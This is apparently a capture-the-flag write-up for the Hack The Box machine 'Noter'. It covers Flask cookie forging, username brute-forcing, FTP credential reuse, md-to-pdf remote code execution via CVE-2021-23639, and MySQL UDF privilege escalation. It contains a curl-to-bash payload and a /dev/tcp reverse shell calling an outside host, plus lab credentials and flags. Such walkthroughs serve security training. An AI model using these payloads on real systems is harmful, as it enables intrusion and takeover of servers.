# Noter (Medium)

#### [Goback](../medium.md)

>21.July.2022 | MrMidnight

-----------------------------------------------------------------------

### Target IP: 10.10.11.160

## 1. Nmap scan it

```bash
nmap -sC -sV -oA scans/Nmap/target 10.10.11.160
```

There seems be a ftp server running on port 21 and the http server on port 5000. I will add the ip pointing to "noter.htb" in /etc/hosts to make it easier.

## 2. Website enum
Visit the website by entering the IP or "noter.htb"(if you added it) and specify the port as "5000": "http://noter.htb:5000"

We can now register a new user and login with it:

```login
Name: test
Email: test@htb.com
Username: test
Password: test
Confirm Password: test 
```

If we registered correctly, we can login into our user. 

"Wappalyzer" shows that its using "Flask". Note that there is a session cookie called session with a value in JSON Web Tokens (JWT) format. You can view the cookie via the development tool or the "cookie editor" extention.
There is a tool called [Flask-Unsign](https://github.com/Paradoxis/Flask-Unsign) we can use to brute force the JWT secret and sign a new JWT.

## 3. Brute forcing a user account

You can install Flask-Unsign by using pip:

```bash
sudo pip3 install flask-unsign[wordlist]
sudo pip3 install flask-unsign
```

Now go copy the cookie from cookie editor and crack it with our new installed tool:

```bash
flask-unsign --unsign --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval --cookie "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.YxIxKQ.4udm3ZKH_h1tGDoFHbE_RH9-M90"
```

```
[*] Session decodes to: {'logged_in': True, 'username': 'midnight'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 17152 attempts
b'secret123'
```

The secret is secret123 , notice that when decoding the JWT we will receive a parameter called username where the value is my username, we can change it to
access an account of another user. Log out of your account and go back to the login page, if we put our username and a differen password, a error message called "Invalid login" appears. But if we put another username that doesn't exist, the message will be Invalid credentials.

With this info, we will go into BurpSuite and bruteforce the username:

1. In Burp suite, capture the login request.
2. Send the request to Intruder
3. In positions select only the value of the username parameter. (username=§test2§&password=blahblahblah) If burpsuite defualts both password and username, you can clear it with the "Clear" button on the right side. Then select the username(§test2§) and click on "Add"
4. In payloads, set the payload to /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt by clicking on the "Load" button and select the wordlist.
5. In Options remove everything from Grep - Match and add "Invalid login".

Now all thats left is to go back to "Options" and press "Start attack". This could take a while depending on your internet speed. After the bruteforce is finnished, the username "blue" is shown as "Login invalid".


## 4. Forging cookie and enum blue

Back to flask-unsign, i will forge a cookie for the "blue" user:
```bash
flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret 'secret123'
```

```
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YnglLA.KQIvvfG7e_VETRjVhp3Bj5fQarg
```

copy this result and set it as the user cookie. Saving it and reload the page will take you to the blue user dashboard. (If it doesnt work at first time try again). 
In the Noter Premium Membership annotation we can see that it is a message about membership, it contains the FTP credentials (blue:blue@Noter!).

>name: blue

>password: blue@Noter!


Lets ftp into the blue user:

```bash
ftp noter.htb
Connected to noter.htb.
220 (vsFTPd 3.0.3)
Name (noter.htb:spakey): blue
331 Please specify the password.
Password:
230 Login successful.
```

There is a file called policy.pdf we can download and open:

```ftp
get policy.pdf
```

It is a password policy file, if we look at the fourth line in Password Creation we will see a very important message: 

```
4. Default user-password generated by the application is in the format of "username@site_name!" (This applies to all your applications)
```

This means the default password for user "ftp_admin" should be "ftp_admin@Noter!":
Lets login into the ftp server again:

```bash
ftp noter.htb
Connected to noter.htb.
220 (vsFTPd 3.0.3)
Name (noter.htb:spakey): ftp_admin
331 Please specify the password.
Password:
230 Login successful.
```

There are now 2 zip files called: "app_backup_1635803546.zip" and "app_backup_1638395546.zip". Download them with "get" and unzip them, reveals each a  app.py file a misc folder and a templates folder. We can compare them in burp suite, by going into the "Comparer" tab and load both files in via the "Load" button on the right side. Click on Compare... "Words" right bottom to compare the two files. The output reveals some mysql credential:

```
# Config MySQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'Nildogg36'
app.config['MYSQL_DB'] = 'app'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'
```

>USER: root
>PASSWORD: Nildogg36

Lets note this for later.

Going down further below we can see a great addition of codes, 4 features were added to the new version: 

```
Export notes = /export_note
Export local = /export_note_local/<string:id>
Export remote = /export_note_remote
Import notes = /import_note
```

Looking at the code I found an RCE through the export remote function in the endpoint /export_note_remote

```
# Export remote
@app.route('/export_note_remote', methods=['POST'])
@is_logged_in
def export_note_remote():
if check_VIP(session['username']):
try:
url = request.form['url']
status, error = parse_url(url)
if (status is True) and (error is None):
try:
r = pyrequest.get(url,allow_redirects=True)
rand_int = random.randint(1,10000)
command = f"node misc/md-to-pdf.js
$'{r.text.strip()}' {rand_int}"
subprocess.run(command, shell=True, executable="/bin/bash")
```

```
command = f"node misc/md-to-pdf.js
$'{r.text.strip()}' {rand_int}"
subprocess.run(command, shell=True, executable="/bin/bash")
```

In a nutshell, it will take a markdown file and turn it into a pdf. Searching CVE's for md-to-pdf leads us to [CVE-2021-23639](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880), which allows us to have RCE. To exploit this, we need to use the "Export directly from cloud" feature of the VIP section. This is only visible while logged in as the "blue" user, as regular users do not have "VIP". 

## 5. Exploiting for a user shell

To successfully get RCE, we need the "Export directly from cloud" feature to point to a markdown file that we control. 

I will be using two files to exploit it. Im sure it could work with only one but im too lazy to make it into one file:

uwu.md

```
---js\n((require("child_process")).execSync("curl http://10.10.14.97/payload.sh | bash"))\n---RCE
```

payload.sh
```bash
#! /bin/bash
/bin/bash -l > /dev/tcp/10.10.14.97/4200 0<&1 2>&1
```

The concept is that the markdown file will grab the payload file and execute it on the target. With the exploit written, we now need to setup a simple pyton server and a netcat listener:

```bash
sudo python3 -m http.server 80
```

```bash
nc -lnvp 4200
```

With everything done, lets head to the "export note" section and enter the URL for Export directly from cloud:

URL: "http://10.10.14.97/uwu.md".

Immediately, a shell opens on the listener. 

## USER-FLAG 
>143c0776e2fb701a475d94e18db6b57c


## 6. Exploit for root

First of all lets get an better shell via python:
```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

After enumerating all services on the box, there is nothing that sticks out. We still have the root credentials for MySQL. Looking at privilege escalation techniques in MySQL leads us to [Privilege Escalation via library](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library). Download and copy the [UDF library](https://www.exploit-db.com/exploits/1518) to the box, and compile it. (I will be putting it into the home directory, but you can also put it in the /tmp directory.)

Since nano isnt really a option here, i will get it through a python server and with wget. You could use a text editor if you have a upgrated shell. At the end there should be a file called "raptor_udf2.c". WIth the payload content. And also dont forget to compile it:

```bash
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
Now lets start the exploit:

```bash
mysql -u root -p 
```

```mysql
use mysql;
create table npn(line blob);
insert into npn values(load_file('/home/svc/raptor_udf2.so'));
select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;
select do_system("cat /root/root.txt > /tmp/root.txt ; chmod 777 /tmp/root.txt");   
```

If it doesnt work first time, dont worry. Try deleating the c file and recompile it again or restarting mysql and reinput the commands. Try it a few times and soon you will get it working.

The exploit wil dump the root flag into /tmp which we then can access. 
```bash
cat /tmp/root.txt
```


## ROOT-FLAG 
>b175bcee887ce81b2d12a7b0f2f2330c


